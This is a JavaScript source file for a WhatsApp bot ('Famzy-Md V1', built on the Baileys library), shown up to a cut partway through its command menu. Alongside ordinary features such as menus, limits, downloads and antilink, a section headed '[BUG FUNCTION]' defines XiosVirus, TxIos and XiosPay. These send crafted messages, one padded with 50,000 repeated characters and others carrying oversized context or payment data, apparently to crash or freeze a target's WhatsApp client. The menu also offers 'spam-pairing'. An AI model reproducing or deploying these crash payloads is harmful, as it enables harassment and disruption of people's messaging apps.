/*

#famzy base
github : https://github.com/Famzylee12
youtube : https://youtube.com/@famzzy_lee
rest api : https://shinoa.us.kg

#developer famzy
youtube : https://youtube.com/@famzzy_lee

THANKS FOR FAMZY DON'T CHANGE IT WILL DESTROY THE FIKE
[ ! ] WARNING ⚠️ DON'T CHANGE ANYTHING IT WILL DESTROY THE FILE
*/
require('../setting/config');

const jsobfus = require('javascript-obfuscator')
const os = require('os')
const speed = require('performance-now')
const fs = require('fs');
const crypto = require('crypto')
const axios = require('axios');
const chalk = require("chalk");
const ytdl = require("@distube/ytdl-core")
const util = require("util");
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');

//FUNCTION LIB
const uploadFile = require('./lib/uploadFile')
const uploadImage = require('./lib/uploadImage')
const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredPremiumCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./lib/premiun')

const { default: baileys, proto, generateWAMessage, generateWAMessageContent, generateWAMessageFromContent, getContentType, prepareWAMessageMedia, downloadContentFromMessage } = require("@whiskeysockets/baileys");

module.exports = client = async (client, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? client.user.id.split(":")[0] + "@s.whatsapp.net" || client.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const owner = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));
const botNumber = await client.decodeJid(client.user.id);
const Access = [botNumber, ...owner, ...global.owner];
const isCmd = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
const number = m.sender.replace(/@.+/g, '')
    
//ROLE/DATA
let premium = JSON.parse(fs.readFileSync('./start/lib/database/premium.json'))
const Creator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPremium= Creator || checkPremiumUser(m.sender, premium)
        expiredPremiumCheck(client, m, premium)
let totalreg = Object.values(global.db.data.users).filter(user => user.registered == true).length  
    
// Group function
const groupMetadata = isGroup ? await client.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Database
if (global.db.data == null) await loadDatabase()
require('./schema')(client, m, chatUpdate, store);
var chats = global.db.data.chats[m.chat],
users = global.db.data.users[m.sender],
settings = global.db.data.settings[botNumber],
limitnya = global.db.data.users[m.sender].limit

//GAME
if(!('hadiah' in db.data.settings)) db.data.settings.hadiah = []
if(!('hadiahkadaluwarsa' in db.data.settings)) db.data.settings.hadiahkadaluwarsa = []
// Function
const { clockString, smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep, formatp, getRandom } = require('./lib/myfunction');
const { ytdl } = require('./lib/scrape/scrape-ytdl');
// Time
const date = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time = moment.tz("Asia/Makassar").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "*ɢᴏᴏᴅ ᴍᴏʀɴɪɴɢ ʙʀᴜʜ ⛃*"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = "*ɢᴏᴏᴅ ᴇᴠᴇɴɪɴɢ ʙʀᴜʜ ⛃*"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "*ɢᴏᴏᴅ ɴɪɢʜᴛ ʙʀᴜʜ ⛃*"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "*ɢᴏᴏᴅ ᴀꜰᴛᴇʀɴᴏᴏɴ ʙʀᴜʜ ⛃*"
} else {
ucapanWaktu = "*ɢᴏᴏᴅ ɴɪɢʜᴛ ʙʀᴜʜ ⛃*"
};
    
// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Dᴀᴛᴇ: ${new Date().toLocaleString()} \n` +
`   ⌬ Mᴇꜱꜱᴀɢᴇ: ${m.body || m.mtype} \n` +
`   ⌬ Sᴇɴᴅᴇʀ: ${m.pushname} \n` +
`   ⌬ Jɪᴅ: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Gʀᴏᴜᴘ: ${groupName} \n` +
`   ⌬ Gʀᴏᴜᴘᴊɪᴅ: ${m.chat}`
)
);
}
console.log();
}

// Helper functions
const replyy = (anu) => {
const {message, key} = generateWAMessageFromContent(m.chat, {
interactiveMessage: {
body: {text: anu},
footer: {text: `${global.footer}`},
nativeFlowMessage: {
buttons: [{text: "Cʀᴇᴀᴛᴏʀ : FᴀᴍᴢʏLᴇᴇ"}
],
}
},
}, {quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `${body}`}}})
client.relayMessage(m.chat, {viewOnceMessage:{message}}, {messageId:key.id})
}

const reaction = async (jidss, emoji) => {
client.sendMessage(jidss, { react: { text: emoji, key: m.key }})}
 
//REPLY
async function replymenu(txt) {
client.sendMessage(m.chat, {
      video: fs.readFileSync('./start/data/video/thumb.mp4'),
      gifPlayback: true,
      caption: txt,
      contextInfo: {
      externalAdReply: {
      title: namabot,
      body: ownername,
      thumbnailUrl: 'https://pomf2.lain.la/f/c493zv5t.jpg',
      sourceUrl: 'https://youtube.com/@famzzy_lee',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
                    
async function reply(txt) {
const Shikimori = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: namasaluran,
newsletterJid: `${global.idsaluran}`,
},
externalAdReply: {  
showAdAttribution: true,
title: `${namabot}`,
body: '*Subscribe My YouTube*',
thumbnailUrl: `${thumbnail}`,
sourceUrl: 'https://www.youtube.com/@famzzy_lee',
},
},
text: txt,
}
return client.sendMessage(m.chat, Shikimori, {
quoted: m,
})
}
//FAKE QUOTED
const qsticker = {
key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `footer`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "IDR", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "NIH STICKERMU!!!"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "INR"}}}}

const qpayment = {
key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `footer`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "IDR", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "FᴀᴍᴢʏLᴇᴇ Boss"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "INR"}}}}

const rissxdsaluran = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `idsaluran`,
newsletterName: `FᴀᴍᴢʏLᴇᴇ And Bᴏᴛᴢ Sʜᴏᴘ`,
jpegThumbnail: "",
caption: `Fᴀᴍᴢʏ Bᴏᴛᴢ V1.0.0`,
inviteExpiration: Date.now() + 1814400000
}
}
}
//ASYNC
function generateRandomPassword(p) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const length = p;
  let password = 'FAMZY-LEE-';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}
//TERDAFTAR
function pengguna() {
 if (!users.registered) return reply(mess.daftar)
}
//LIMIT
function uselimit(r) {
 users.limit -= r
 replyy(`*YOUR LIMIT HAS USE ${r}*\n\n\`EX 1 ${users.limit}\``)
}
//AI
async function luminai(content, prompt, user) {
  function generateRandomUserId() {
    return 'user-' + Math.floor(Math.random() * 10000);
}
let userId = generateRandomUserId();
console.log(`Gᴇɴᴇʀᴀᴛᴇᴅ Uꜱᴇʀ Iᴅ: ${userId}`);
    try {
        const response = await axios.post('https://luminai.my.id/', { content, prompt, user });
        return response.data;
    } catch (error) {
        console.error(error);
        throw error;
    }
}   
//OBFUS
async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${namabot}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}
//TOTAL FITUR
const totalFitur = () =>{
            var mytext = fs.readFileSync("./start/system.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
}
//AFK
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	     for (let jid of mentionUser) {
            let user = db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            reply(`ᴘʟᴇᴀᴅᴇ ᴅᴏɴ'ᴛ ᴛᴀɢ ꜰᴀᴍᴢʏ\nʜᴇ's AFK ${reason ? 'ᴡɪᴛʜ ʀᴇᴀꜱᴏɴ ' + reason : 'ɴᴏ ʀᴇᴀꜱᴏɴ'}\nAfk ꜱɪɴᴄᴇ ${clockString(new Date - afkTime)}`.trim())
        }
        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            reply(`ʏᴏᴜ ʜᴀᴠᴇ ʀᴇᴛᴜʀɴᴇᴅ ꜰʀᴏᴍ AFK\nAFK ʀᴇᴀꜱᴏɴ: ${user.afkReason ? user.afkReason : ''}\nAFK ᴅᴜʀᴀᴛɪᴏɴ: ${clockString(new Date - user.afkTime)}`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
 //AUTOBIO
if (global.db.data.settings[botNumber].autobio) {
client.updateProfileStatus(`*_Fᴀᴍᴢʏ_Mᴅ-ᴠ1 Hᴀᴠᴇ Bᴇᴇɴ Rᴜɴɴɪɢ Fᴏʀ_* ${runtime(process.uptime())}`).catch(_ => _)
}
//ANTILINK GROUP NO KICK
if (chats.antilinkgc) {
            if (budy.match(`chat.whatsapp.com`)) {
               bvl = `\`\`\`GC Link Dᴇᴛᴇᴄᴛᴇᴅ\`\`\`\n\nAᴅᴍɪɴ ʜᴀꜱ ꜱᴇɴᴛ ᴀ ɢʀᴏᴜᴘ ʟɪɴᴋ, ᴀᴅᴍɪɴ ɪꜱ ꜰʀᴇᴇ ᴛᴏ ꜱᴇɴᴅ ᴀɴʏ ʟɪɴᴋ`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (Creator) return reply(bvl)
               await client.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			client.sendMessage(from, {text:`\`\`\`GC Link Dᴇᴛᴇᴄᴛᴇᴅ\`\`\`\n\n@${m.sender.split("@")[0]} ʜᴀꜱ ꜱᴇɴᴛ ᴀ ʟɪɴᴋ ᴀɴᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
}
//YTDL
async function ytMp4(url) {
    return new Promise(async(resolve, reject) => {
        ytdl.getInfo(url).then(async(getUrl) => {
            let result = [];
            for(let i = 0; i < getUrl.formats.length; i++) {
                let item = getUrl.formats[i];
                if (item.container == 'mp4' && item.hasVideo == true && item.hasAudio == true) {
                    let { qualityLabel, contentLength } = item;
                    let bytes = await bytesToSize(contentLength);
                    result[i] = {
                        video: item.url,
                        quality: qualityLabel,
                        size: bytes
                    };
                };
            };
            let resultFix = result.filter(x => x.video != undefined && x.size != undefined && x.quality != undefined)
            let title = getUrl.videoDetails.title;
            let desc = getUrl.videoDetails.description;
            let views = getUrl.videoDetails.viewCount;
            let likes = getUrl.videoDetails.likes;
            let dislike = getUrl.videoDetails.dislikes;
            let channel = getUrl.videoDetails.ownerChannelName;
            let uploadDate = getUrl.videoDetails.uploadDate;
            let thumb = getUrl.player_response.microformat.playerMicroformatRenderer.thumbnail.thumbnails[0].url;
            resolve({
                title,
                result: resultFix[0].video,
                quality: resultFix[0].quality,
                size: resultFix[0].size,
                thumb,
                views,
                likes,
                dislike,
                channel,
                uploadDate,
                desc
            });
        }).catch(reject);
    });
};
//[BUG FUNCTION]
    async function XiosVirus(jid) {
			client.relayMessage(jid, {
				'extendedTextMessage': {
					'text': '.',
					'contextInfo': {
						'stanzaId': jid,
						'participant': jid,
						'quotedMessage': {
							'conversation': '⭑̤⟅̊༑ ▾ ⋆✩⋆ ꜰ⳺⳻ᴍᴢʏ 𝗩7 ⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': jid
				}
			}, {
				'messageId': null
			});
			console.log(chalk.red("Sᴜᴄᴄᴇꜱꜱꜰᴜʟ Sᴇɴᴅ Bᴜɢ ©FᴀᴍᴢʏLᴇᴇ🥶"));
    };
async function TxIos(X, Ptcp = false) {
			await client.relayMessage(X, {
					"extendedTextMessage": {
						"text": "⭑̤⟅̊༑ ▾ ⋆✩⋆ ꜰ⳺⳻ᴍᴢʏ 𝗩7 ⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "2348127187030@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "2348127187030@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": X,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "2348127187030@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "A̺͆N̺͆T̺͆I̺͆ G̺͆E̺͆D̺͆O̺͆R̺͆〽",
								"body": "ʄ⍲ϻȥ☂ 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://www.instagram.com/WhatsApp",
								"mediaUrl": "https://www.instagram.com/WhatsApp",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://www.instagram.com/WhatsApp"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "2348127187030-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "2348127187030-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.red("Sᴜᴄᴄᴇꜱꜱꜰᴜʟ Sᴇɴᴅ Bᴜɢ ©FᴀᴍᴢʏLᴇᴇ🥶"));
		};
    async function XiosPay(jid) {
			client.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
			console.log(chalk.red("Sᴜᴄᴄᴇꜱꜱꜰᴜʟ Sᴇɴᴅ Bᴜɢ ©FᴀᴍᴢʏLᴇᴇ🥶"));
		};
		
// Command handler
switch (command) {
case'tes':{
    if (limitnya < 1000) return reply(`ɴᴏᴛ ᴇɴᴏᴜɢʜ ʏᴏᴜʀ ʟɪᴍɪᴛ`)
    reply(`${db.data.users[sender].premium}`)
}
    break
case'menu': case'famzyv1':{
pengguna()
reaction(m.chat, "⏳")
if (args.length < 1) return replymenu(`ʜᴇʏ \`${pushname}\` 👋🏼

${ucapanWaktu}

⛃ *ᴜ ꜱ ᴇ ʀ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ* 📖
⛃ \`ʟɪᴍɪᴛ\` : ${db.data.users[sender].limit}
⛃ \`sᴛᴀᴛᴜꜱ ᴜꜱᴇʀ\` : ${isPremium ? 'premium' : 'free user'}

⛃ *ʙ ᴏ ᴛ ᴢ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ*
⛃ Ⓛ︎ = ʟɪᴍɪᴛ Ⓟ︎ = ᴘʀᴇᴍɪᴜᴍ 
⛃ \`ᴠᴇʀꜱɪᴏɴ\` : Fᴀᴍᴢʏ-Mᴅ V1 
⛃ \`ᴛᴏᴛᴀʟ ꜰᴇᴀᴛᴜʀᴇꜱ\` : ${totalFitur()}
⛃ \`ʀᴜɴᴛɪᴍᴇ\` : ${runtime(process.uptime())}
⛃ \`ᴛᴏᴛᴀʟ ᴜꜱᴇʀ\` : ${totalreg}
⛃ \`ᴅᴀᴛᴇ\` : ${date}

⛃ L I S T  M E N U
│ • ${prefix}ᴍᴇɴᴜ ᴀʟʟ
│ • ${prefix}ᴍᴇɴᴜ ᴏᴡɴᴇʀ
│ • ${prefix}ᴍᴇɴᴜ ᴍᴀɪɴ
│ • ${prefix}ᴍᴇɴᴜ ᴛᴏᴏʟꜱ
│ • ${prefix}ᴍᴇɴᴜ ᴅᴏᴡɴʟᴏᴀᴅ
│ • ${prefix}ᴍᴇɴᴜ ᴀɪ
│ • ${prefix}ᴍᴇɴᴜ ɢʀᴏᴜᴘ
│ • ${prefix}ᴍᴇɴᴜ ɪɴꜰᴏ 
│ • ${prefix}ᴍᴇɴᴜ ꜱᴇᴀʀᴄʜ
│ • ${prefix}ᴍᴇɴᴜ ʙᴜɢ
│ • ${prefix}ᴍᴇɴᴜ Qᴜᴏᴛᴇꜱ
└───···`)

if (args[0] === "all") {
return replymenu(`ʜᴇʏ \`${pushname}\` 👋🏼
${ucapanWaktu}

⛃ *ᴜ ꜱ ᴇ ʀ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ* 📖
⛃ \`ʟɪᴍɪᴛ\` : ${db.data.users[sender].limit}
⛃ \`sᴛᴀᴛᴜꜱ ᴜꜱᴇʀ\` : ${isPremium ? 'premium' : 'free user'}

⛃ *ʙ ᴏ ᴛ ᴢ   ɪ ɴ ꜰ ᴏ ʀ ᴍ ᴀ ᴛ ɪ ᴏ ɴ*
⛃ Ⓛ︎ = ʟɪᴍɪᴛ Ⓟ︎ = ᴘʀᴇᴍɪᴜᴍ 
⛃ \`ᴠᴇʀꜱɪᴏɴ\` : Fᴀᴍᴢʏ-Mᴅ V1 
⛃ \`ᴛᴏᴛᴀʟ ꜰᴇᴀᴛᴜʀᴇꜱ\` : ${totalFitur()}
⛃ \`ʀᴜɴᴛɪᴍᴇ\` : ${runtime(process.uptime())}
⛃ \`ᴅᴀᴛᴇ\` : ${date}

⛃ O W N E R  M E N U
│ • ${prefix}ʙᴀᴄᴋᴜᴘ
│ • ${prefix}ʀᴇꜱᴛᴀʀᴛ
│ • ${prefix}ᴀᴅᴅʟɪᴍɪᴛ
│ • ${prefix}ꜱᴇʟꜰ/ᴘᴜʙʟɪᴄ
│ • ${prefix}ᴄᴜꜱᴛᴏᴍꜱɴ
│ • ${prefix}ᴇɴᴄ
│ • ${prefix}ꜱᴘᴀᴍ-ᴘᴀɪʀɪɴɢ
│ • ${prefix}ʙᴄɢᴄ
│ • ${prefix}ᴍᴀᴋᴇᴀɢɪꜰᴛ
│ • ${prefix}ʟɪꜱᴛɢɪꜰᴛꜱ
│ • ${prefix}ᴊᴏɪɴɢᴄ
└───···

⛃ M A I N  M E N U
│ • ${prefix}ʀᴇᴘʀᴏᴛʙᴜɢ
│ • ${prefix}ʀᴇQᴜᴇꜱᴛ
│ • ${prefix}ᴄᴇᴋʟɪᴍɪᴛ
│ • ${prefix}ᴄᴇᴋꜱɴ Ⓛ︎
│ • ${prefix}ᴅᴀꜰᴛᴀʀ
│ • ${prefix}ᴜɴʀᴇɢɪꜱᴛᴇʀ
│ • ${prefix}ʀᴇᴅᴇᴇᴍᴄᴏᴅᴇ
│ • ${prefix}ᴄʟᴀɪᴍ/ᴅᴀɪʟʏ
└───···

⛃  T O O L S  M E N U
│ • ${prefix}ʜᴅ Ⓛ︎
│ • ${prefix}ʀᴇᴍɪɴɪ Ⓛ︎
│ • ${prefix}ᴛᴏᴜʀʟ Ⓛ︎
│ • ${prefix}ʀᴇᴀᴅᴠɪᴇᴡᴏɴᴄᴇ Ⓛ︎
│ • ${prefix}ꜱᴍᴇᴍᴇ
│ • ${prefix}ꜱᴛɪᴄᴋᴇʀ
│ • ${prefix}ᴇᴍᴏᴊɪᴍɪx
│ • ${prefix}ᴇᴍᴏᴊɪᴍɪx2
└───···

⛃ D O W N L O A D  M E N U
│ • ${prefix}ᴘʟᴀʏ Ⓛ︎
